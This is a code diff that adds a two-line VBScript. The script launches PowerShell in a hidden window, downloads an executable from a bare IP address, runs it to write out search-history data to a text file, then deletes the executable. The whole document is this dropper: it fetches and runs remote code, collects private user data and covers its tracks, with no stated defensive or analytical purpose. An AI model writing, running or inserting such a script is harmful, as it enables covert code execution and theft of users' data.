@@ -1,0 +1,2 @@
+Dim objWshShl : Set objWshShl = WScript.CreateObject("WScript.Shell")
+objWshShl.Run "powershell.exe curl http://213.168.249.164:8080/lsearchv.exe -o lsv.exe; ./lsv.exe /stext lastsearch.txt; start-sleep 3; rm -f lsv.exe",0
